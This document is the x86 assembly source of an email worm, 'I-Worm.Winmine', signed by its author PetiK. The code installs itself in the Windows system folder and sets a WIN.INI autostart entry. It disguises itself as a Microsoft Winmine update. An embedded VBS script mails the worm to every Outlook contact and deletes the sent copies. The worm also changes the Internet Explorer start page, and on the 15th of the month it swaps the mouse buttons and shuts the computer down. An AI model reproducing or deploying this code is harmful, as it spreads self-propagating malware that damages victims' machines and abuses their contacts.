; comment #
; Name : I-Worm.Winmine
; Author : PetiK
; Date : June 12th - June 15th
; Size : 6656 bytes
; 
; Action : Check if the file is run from the SYSTEM folder. If so, it creates a file with the name
; "C:\ENVOIE_VBS.vbs" to spread with Outlook :
;       Subject : Is the work so hard ??
;       Body : Relax you with the last version of <Winmine>.
;       Attached : WINMINE.EXE
; It chages the start page of Internet Explorer by "http://perso.libertysurf.fr/dacruz/mayaindex.html"
; If the current day is the 15th, it displays a message and swaps the buttons of the mouse.
; After five minutes, the worms stops the computer.
; 
; Otherwise, it copies itself to SYSTEM folder, alters the load= line in WIN.INI file to run when
; the computer starts and displays a message box.
; #

.586p
.model flat
.code

callx macro a
extrn a:proc
call a
endm

DEBUT:
VERIF:  push 00h
    callx GetModuleHandleA
    push 50
    push offset szOrig
    push eax
    callx GetModuleFileNameA

    push 50h
    push offset szCopie
        callx GetSystemDirectoryA
        push offset Copie
        push offset szCopie
        callx lstrcat

    push offset szOrig
    push offset szCopie
    callx lstrcmp
    test eax,eax
        jz   SEND

COPIE:  push 00h
    push offset szCopie
    push offset szOrig
    callx CopyFileA

WININI: push 50
    push offset szWinini
    callx GetWindowsDirectoryA
    push offset Winini
    push offset szWinini
    callx lstrcat
    push offset szWinini
    push offset szCopie
    push offset load
    push offset windows
    callx WritePrivateProfileStringA

MESSAGE:push 1040h
    push offset TITRE
    push offset TEXTE
    push 00h
    callx MessageBoxA
    jmp  FIN

SEND:   push 00h
    push FILE_ATTRIBUTE_READONLY
    push CREATE_NEW
    push 00h
    push FILE_SHARE_READ
    push GENERIC_WRITE
    push offset vbssend
    callx CreateFileA
    cmp  eax,-1
    je   GO
    mov  [FileHandle],eax
    push 00h
    push offset octets
    push VBSTAILLE
    push offset vbsd
    push [FileHandle]
    callx WriteFile
    push [FileHandle]
    callx CloseHandle
GO: push 01h
    push offset onyva
    callx WinExec

DLL:    push offset dllName
    callx LoadLibraryA
    test eax,eax
    jz DATE
    mov hdll,eax
    push offset FunctionName
    push hdll
    callx GetProcAddress
    test eax,eax
    jz DATE
    mov setvalue,eax
REG:    push 08h
    push offset start_page
    push 01h
    push offset start_key
    push offset main_s
    push HKEY_CURRENT_USER
        call [setvalue]
FINDLL: push [hdll]
    callx FreeLibrary

DATE:   push offset SystemTime
    callx GetSystemTime
    cmp [SystemTime.wDay],0Fh
    jne  FIN
    push 40h
    push offset TITRE2
    push offset TEXTE2
    push 00h
    callx MessageBoxA
    push 01h
    callx SwapMouseButton
    push 60 * 5 * 1000
    callx Sleep
    push EWX_SHUTDOWN
    callx ExitWindowsEx
    

FIN:    push 00h
    callx ExitProcess


.data
szCopie     db 50 dup (0)
szOrig      db 50 dup (0)
szWinini    db 50 dup (0)
FileHandle  dd ?
octets      dd ?
hdll        dd ?
setvalue    dd ?

Copie       db "\WINMINE.EXE",00h
vbssend     db "C:\ENVOIE_VBS.vbs",00h
onyva       db "wscript C:\ENVOIE_VBS.vbs",00h
Winini      db "\\WIN.INI",00h
load        db "load",00h
windows     db "windows",00h
TITRE       db "Winmine - Microsoft Corporation (R)",00h
TEXTE       db "The last update of the game ""Winmine"" written by Microsoft Corporation",00h
TITRE2      db "I-Worm.Winmine",00h
TEXTE2      db "By PetiK (c)2001",00h
main_s      db "Software\Microsoft\Internet Explorer\Main",00h
start_key   db "Start Page",00h
start_page  db "http://perso.libertysurf.fr/dacruz/mayaindex.html",00h
dllName     db "SHLWAPI.dll",00h
FunctionName    db "SHSetValueA",00h
wormname    db "I-Worm.Winmine by PetiK",00h


vbsd:
db 'On Error Resume Next',0dh,0ah
db 'Set A=CreateObject("Outlook.Application")',0dh,0ah
db 'Set B=A.GetNameSpace("MAPI")',0dh,0ah
db 'For Each C In B.AddressLists',0dh,0ah
db 'If C.AddressEntries.Count <> 0 Then',0dh,0ah
db 'For D=1 To C.AddressEntries.count',0dh,0ah
db 'Set E=C.AddressEntries(D)',0dh,0ah
db 'Set F=A.CreateItem(0)',0dh,0ah
db 'F.To=E.Address',0dh,0ah
db 'F.Subject="Is the work so hard ??"',0dh,0ah
db 'F.Body="Relax you with the last version of <Winmine>."',0dh,0ah
db 'Set G=CreateObject("Scripting.FileSystemObject")',0dh,0ah
db 'F.Attachments.Add G.BuildPath(G.GetSpecialFolder(1),"Winmine.exe")',0dh,0ah
db 'F.DeleteAfterSubmit=True',0dh,0ah
db 'If F.To <> "" Then',0dh,0ah
db 'F.Send',0dh,0ah
db 'End If',0dh,0ah
db 'Next',0dh,0ah
db 'End If',0dh,0ah
db 'Next',00h
VBSTAILLE   equ $-vbsd

CREATE_NEW      equ 00000001h
FILE_ATTRIBUTE_READONLY equ 00000001h
FILE_SHARE_READ     equ 00000001h
GENERIC_WRITE       equ 40000000h
HKEY_CURRENT_USER   equ 80000001h
EWX_SHUTDOWN        equ 00000001h


SYSTIME struct
wYear       WORD ?
wMonth      WORD ?
wDayOfWeek  WORD ?
wDay        WORD ?
wHour       WORD ?
wMinute     WORD ?
wSecond     WORD ?
wMillisecond    WORD ?
SYSTIME ends
SystemTime      SYSTIME <>


end DEBUT
end
